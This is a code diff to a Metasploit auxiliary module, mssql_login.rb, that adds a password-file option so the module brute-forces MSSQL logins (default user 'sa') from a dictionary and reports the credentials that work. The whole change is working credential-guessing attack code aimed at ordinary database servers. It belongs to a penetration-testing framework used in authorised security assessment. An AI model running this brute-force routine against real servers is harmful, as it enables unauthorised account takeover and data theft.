@@ -1,5 +1,5 @@
 ##
-# $Id: mssql_login.rb 6479 2009-04-13 14:33:26Z kris $
+# $Id: mssql_login.rb 6798 2009-07-14 11:30:41Z hdm $
 ##
 
 ##
@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(	
 			'Name'           => 'MSSQL Login Utility',
-			'Version'        => '$Revision: 6479 $',
+			'Version'        => '$Revision: 6798 $',
 			'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',
 			'Author'         => 'MC',
 			'License'        => MSF_LICENSE
@@ -32,6 +32,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptString.new('MSSQL_USER', [ false, 'The username to authenticate as', 'sa']),
 				OptString.new('MSSQL_PASS', [ false, 'The password for the specified username', '']),
+				OptString.new('MSSQL_PASS_FILE', [ false, 'A dictionary of passwords to perform a bruteforce attempt', '']),
 				Opt::RPORT(1433)
 			], self.class)
 	end
@@ -39,30 +40,43 @@ class Metasploit3 < Msf::Auxiliary
 	def run_host(ip)
 
 		user = datastore['MSSQL_USER'].to_s
-		pass = datastore['MSSQL_PASS'].to_s
-		
+		@passwds = []
+		if datastore['MSSQL_PASS_FILE'].to_s != ''
+			File.open(datastore['MSSQL_PASS_FILE'], "r") do |fd|
+				buff = fd.read(fd.stat.size)
+				buff.split("\n").each do |line|
+                    line.strip!
+                    next if line =~ /^#/
+                    @passwds << line if not @passwds.include?(line)
+                end
+			end
+		else
+			@passwds << datastore['MSSQL_PASS'].to_s
+		end
+
 		user = "sa" if user.length == 0
-		
-		begin
-		info = mssql_login(user, pass)
+		@passwds.each do |pass|		
+			print_status("Trying username:'#{user}' with password:'#{pass}' against #{ip}:#{rport}")
+			begin
+			info = mssql_login(user, pass)
 
-		if (info == true)
-			print_status("#{ip}:#{rport} successful logged in as '#{user}' with password '#{pass}'")
-			report_auth_info(
-				:host   => ip,
-				:proto  => 'MSSQL',
-				:user   => user,
-				:pass   => pass,
-				:targ_host      => ip,
-				:targ_port      => rport
-			)
-                else
-			print_status("#{ip}:#{rport} failed to login as '#{user}'")
-		end
-		rescue ::Interrupt
-			raise $!
-		rescue ::Rex::ConnectionError
-		end
-	end	
-
+			if (info == true)
+				print_status("#{ip}:#{rport} successful logged in as '#{user}' with password '#{pass}'")
+				report_auth_info(
+					:host   => ip,
+					:proto  => 'MSSQL',
+					:user   => user,
+					:pass   => pass,
+					:targ_host      => ip,
+					:targ_port      => rport
+				)
+                	else
+				print_status("#{ip}:#{rport} failed to login as '#{user}'")
+			end
+			rescue ::Interrupt
+				raise $!
+			rescue ::Rex::ConnectionError
+			end
+		end	
+	end
 end
